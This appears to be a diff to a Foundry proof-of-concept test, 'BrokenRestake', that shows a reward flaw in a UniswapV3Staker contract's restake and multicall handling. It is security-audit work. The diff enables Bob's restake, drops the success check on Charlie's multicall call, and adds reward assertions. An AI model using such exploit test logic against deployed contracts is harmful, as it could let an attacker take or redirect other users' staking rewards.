@@ -124,10 +124,10 @@ contract BrokenRestake is Boilerplate, IERC721Receiver {
         vm.warp(block.timestamp + 1 weeks); // 2.a Warp to incentive end time
         gauge.newEpoch();                   // 2.b Queue minter rewards for the next cycle
 
-        // vm.startPrank(BOB);
-        // uniswapV3Staker.restakeToken(tokenIdBob); // 3.a Bob can restake his own token
-        // vm.stopPrank();
-        // 
+        vm.startPrank(BOB);
+        uniswapV3Staker.restakeToken(tokenIdBob); // 3.a Bob can restake his own token
+        vm.stopPrank();
+
         // vm.startPrank(CHARLIE);
         // vm.expectRevert(bytes4(keccak256("NotCalledByOwner()")));
         // uniswapV3Staker.restakeToken(tokenIdAlice); // 3.b Charlie cannot restake Alice's token
@@ -147,12 +147,14 @@ contract BrokenRestake is Boilerplate, IERC721Receiver {
         data[1] = functionCall2;
 
         vm.startPrank(CHARLIE);
-        (bool success, ) = address(uniswapV3Staker).call(abi.encodeWithSignature("multicall(bytes[])", data));
-        require(success);
+        address(uniswapV3Staker).call(abi.encodeWithSignature("multicall(bytes[])", data));
         vm.stopPrank();
 
         uint256 rewardsBob = uniswapV3Staker.rewards(BOB);
         uint256 rewardsAlice = uniswapV3Staker.rewards(ALICE);
+
+        assertNotEq(rewardsBob, 0, "Bob should have rewards");
+        assertEq(rewardsAlice, 0, "Alice should not have rewards");
 
         console.log("");
         console.log("=================");
